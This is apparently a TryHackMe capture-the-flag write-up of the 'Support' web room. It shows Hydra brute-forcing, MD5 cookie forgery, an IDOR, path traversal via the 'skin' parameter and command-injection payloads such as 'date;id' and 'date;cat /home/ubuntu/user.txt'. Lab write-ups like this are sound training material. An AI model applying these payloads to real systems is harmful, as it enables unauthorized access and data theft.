@@ -1,0 +1,349 @@
+---
+
+type: writeup  
+platform: TryHackMe  
+room: Support  
+os: Linux  
+environment: Web Application  
+last_verified: 2026-09-27
+
+techniques:
+
+- brute-force
+    
+- cookie-tampering
+    
+- idor
+    
+- path-traversal
+    
+- arbitrary-file-read
+    
+- command-injection
+    
+- remote-code-execution
+    
+
+tools:
+
+- nmap
+    
+- gobuster
+    
+- curl
+    
+- burp-suite
+    
+- hydra
+    
+
+---
+# Support — Web Exploitation
+
+**Attack path:** Helpdesk brute force → cookie authorization bypass → IDOR → arbitrary file read → admin access → command injection → `www-data`
+
+## 1. Reconnaissance
+
+Initial service enumeration:
+
+```
+sudo nmap -sV -sC <TARGET_IP> -oA nmap
+```
+
+Relevant services:
+
+```
+22/tcp open  ssh
+80/tcp open  http
+```
+
+SSH required credentials, so the Web application became the primary attack surface.
+
+The login page exposed an internal address:
+
+```
+help@support.thm
+```
+
+This provided a likely valid account for authentication testing.
+
+Web content discovery was then performed:
+
+```
+gobuster dir \
+  -u http://<TARGET_IP> \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,js,bak,zip
+```
+
+Relevant results:
+
+```
+/info.php
+/config.php
+/api.php
+/dashboard.php
+```
+
+`api.php` and `dashboard.php` redirected unauthenticated requests to the login page, confirming that they existed but required authentication.
+
+---
+
+## 2. Initial Access — Helpdesk Account
+
+A failed login consistently returned:
+
+```
+Invalid credentials
+```
+
+This gave a reliable failure condition for Hydra.
+
+After validating the request format with an intentionally invalid password, the exposed helpdesk account was tested against `rockyou.txt`:
+
+```
+hydra \
+  -l help@support.thm \
+  -P /usr/share/wordlists/rockyou.txt \
+  <TARGET_IP> \
+  http-post-form \
+  "/:email=^USER^&password=^PASS^:Invalid credentials"
+```
+
+A valid password was recovered:
+
+```
+Username: help@support.thm
+Password: <REDACTED>
+```
+
+Manual authentication confirmed the credential.
+
+---
+
+## 3. Cookie Authorization Bypass
+
+Authentication alone did not provide access to the internal API.
+
+The authenticated session contained an additional cookie:
+
+```
+isITUser=68934a3e9455fa72420237eb05902327
+```
+
+The value is a 32-character hexadecimal string, suggesting MD5. It corresponds to the digest of:
+
+```
+false
+```
+
+This suggested that the application might trust the cookie to decide whether the current user belongs to IT.
+
+The digest of `true` was generated:
+
+```
+echo -n "true" | md5sum
+```
+
+```
+b326b5062b2f0e69046810717534cb09
+```
+
+Replacing the cookie value with this digest granted access to the previously restricted API.
+
+The issue was therefore an **authorization flaw**: the server trusted a client-controlled cookie to determine whether the authenticated user had IT privileges.
+
+---
+
+## 4. Internal User API — IDOR / BOLA
+
+The API exposed a user endpoint.
+
+The helpdesk account could retrieve its own profile:
+
+```
+/user/3
+```
+
+```
+{
+  "email": "help@support.thm",
+  "2FA": false,
+  "admin": false
+}
+```
+
+Because the object identifier was numeric, another ID was tested:
+
+```
+/user/1
+```
+
+Response:
+
+```
+{
+  "email": "specialadmin@support.thm",
+  "2FA": false,
+  "admin": true
+}
+```
+
+The application returned another user's profile without checking whether the authenticated helpdesk account was authorized to access it.
+
+This confirmed an **IDOR / BOLA** vulnerability and revealed an administrative account:
+
+```
+specialadmin@support.thm
+```
+
+Two additional ideas were tested at this point:
+
+```
+api.php?id=1'
+```
+
+returned:
+
+```
+null
+```
+
+and adding:
+
+```
+admin=true
+```
+
+as a cookie produced no privilege change.
+
+Neither path provided a useful result, so attention returned to the dashboard functionality.
+
+---
+
+## 5. Path Traversal → Arbitrary File Read
+
+The dashboard contained a theme selector using the `skin` parameter:
+
+```
+dashboard.php?skin=default
+```
+
+Testing:
+
+```
+dashboard.php?skin=../dashboard
+```
+
+caused the dashboard content to appear again inside the page.
+
+This indicated that `skin` influenced a server-side file path.
+
+Relevant application logic showed:
+
+```
+$webRoot = realpath('/var/www/html/skins');
+
+$requested = realpath($webRoot . '/' . $skin . '.php');
+
+if ($requested !== false && strpos($requested, $another) === 0) {
+    readfile($requested);
+}
+```
+
+The path was normalized with `realpath()`, but the subsequent boundary check still allowed traversal outside the intended `skins` directory.
+
+Because the application used:
+
+```
+readfile($requested);
+```
+
+the targeted PHP file was returned as content rather than executed.
+
+The resulting primitive was therefore:
+
+```
+Path Traversal
+    ↓
+Arbitrary File Read
+```
+
+rather than classic PHP LFI.
+
+The traversal was then used to read the application configuration:
+
+```
+dashboard.php?skin=/../config
+```
+
+This exposed administrative credentials:
+
+```
+Username: specialadmin@support.thm
+Password: <REDACTED>
+```
+
+The credential was validated through the normal login form and provided administrative access.
+
+---
+
+## 6. Command Injection
+
+The administrative dashboard exposed a system-information function controlled through the `sys` POST parameter.
+
+A legitimate request could contain:
+
+```
+POST /dashboard.php HTTP/1.1
+
+sys=date +"%H:%M:%S"
+```
+
+The application attempted to restrict execution to the `date` command.
+
+A minimal injection test was used:
+
+```
+date;id
+```
+
+Result:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The appended `id` command was executed by the server, confirming **OS Command Injection**.
+
+The result also established the execution context:
+
+```
+www-data
+```
+
+The final room objective could then be retrieved through the same command-execution primitive:
+
+```
+date;cat /home/ubuntu/user.txt
+```
+
+Result:
+
+```
+THM{REDACTED}
+```
+
+---
+
+## Key Takeaways
+
+- Authentication and authorization are separate controls. The helpdesk account was legitimately authenticated, but the application trusted a client-controlled cookie for privilege decisions.
+    
+- Numeric object identifiers should always be tested for object-level authorization. Changing `/user/3` to `/user/1` was enough to confirm the IDOR/BOLA condition.
+    
+- `realpath()` does not prevent traversal by itself. The normalized path still needs to be checked against the correct allowed directory.
+    
+- `readfile()` produces a file-read primitive, not PHP file inclusion. The implementation matters when naming the vulnerability.
+    
+- For command injection, a small payload such as `date;id` is enough to confirm execution and identify the resulting security context.
